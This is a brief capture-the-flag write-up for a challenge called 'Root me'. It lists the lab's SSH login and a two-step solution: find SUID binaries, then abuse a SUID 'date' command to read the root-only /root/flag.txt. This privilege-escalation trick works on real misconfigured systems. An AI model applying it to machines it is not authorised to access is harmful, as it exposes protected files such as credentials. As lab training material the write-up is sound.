# Root me
* 

## Challenge Text
* SSH into the challenge host on port 2222
* Username: ubuntu Password: jctf2022!
* Find the flag

## Solution
* Use the find command to find any files owned by root with the SUID bit set
```
find / -perm -4000 
```

* Use the date command to leak the flag
```
date -f /root/flag.txt
```

